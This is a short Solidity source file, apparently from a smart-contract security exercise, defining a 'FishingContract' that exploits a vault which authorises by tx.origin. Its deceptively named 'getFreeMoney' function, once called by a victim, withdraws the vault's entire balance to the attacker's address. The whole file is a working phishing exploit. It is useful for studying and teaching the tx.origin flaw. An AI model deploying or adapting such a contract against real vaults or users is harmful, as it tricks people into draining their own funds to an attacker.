// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {IVaultTxOrigin} from "../interfaces/IVaultTxOrigin.sol";

contract FishingContract {
    address public immutable owner;
    IVaultTxOrigin public immutable vault;

    constructor(address _owner, address _vault) {
        require(_owner != address(0), "owner address cannot be 0");
        owner = _owner;
        vault = IVaultTxOrigin(_vault);
    }

    function getFreeMoney() external {
        vault.withdraw(owner, address(vault).balance);
    }
}
